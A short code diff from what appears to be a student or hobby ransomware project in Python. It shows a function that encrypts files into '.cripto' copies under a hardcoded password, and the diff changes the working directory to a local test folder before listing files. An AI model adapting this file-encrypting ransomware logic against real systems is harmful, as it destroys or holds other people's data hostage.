@@ -46,7 +46,7 @@ def criptografa(caminho_arquivo):
     with open(caminho_arquivo, 'rb') as in_file, open(caminho_arquivo+'.cripto', 'wb') as out_file:
         encrypt(in_file, out_file, 'password')
 
-os.chdir('/home/tarcisio/Desktop/Projetos/Ransomware/tests/teste')
+os.chdir(os.getcwd()+'/teste')
 listagem=os.listdir(os.getcwd())
 for arquivo in listagem:
     print(arquivo)
